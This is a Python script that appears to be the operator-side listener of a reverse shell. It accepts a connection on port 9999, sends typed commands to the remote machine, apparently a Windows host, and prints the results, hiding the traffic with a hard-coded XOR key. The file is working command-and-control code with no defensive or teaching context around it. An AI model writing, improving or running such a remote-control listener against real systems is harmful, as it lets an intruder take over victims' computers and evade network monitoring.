import socket

KEY = b'secretkey'
port = 9999 

def xor_crypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def handle_client(client_socket):
    try:
        while True:
            command = input("Enter command: ")
            if not command: continue

            encrypted_command = xor_crypt(command.encode(), KEY)
            client_socket.send(encrypted_command)

            if command.lower() == 'exit': break

            # Use a large buffer for 'dir' outputs
            encrypted_output = client_socket.recv(16384)
            if not encrypted_output: break
            
            # Decrypt and decode using Windows 'cp437' to fix the charmap error
            decrypted_data = xor_crypt(encrypted_output, KEY)
            output = decrypted_data.decode('cp437', errors='replace')
            print(f"Output:\n{output}")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(1)
    print(f"[*] Server listening on port {port}")
    while True:
        client_sock, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        handle_client(client_sock)

if __name__ == "__main__":
    start_server()